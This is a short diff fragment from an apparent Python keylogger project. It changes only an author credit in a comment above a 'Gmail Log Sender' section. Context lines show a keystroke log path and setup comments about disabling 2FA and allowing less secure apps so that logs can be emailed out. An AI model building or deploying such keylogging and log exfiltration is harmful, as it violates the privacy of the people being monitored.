@@ -40,7 +40,7 @@ def add(f_pth=""):
 td = datetime.now().strftime('%Y-%b-%d')
 f_name = 'D:\\Documents\\Programming\\Python\\Keylogger\\Logs\\'+ td +'.txt'
 #=====================================================#
-#Gmail Log Sender - Tragedy
+#Gmail Log Sender - saiko
 #Disable 2FA And Allow "Less Secure Apps"
 #Change first_email_time And Choose Your Interval
 def Send_Log():
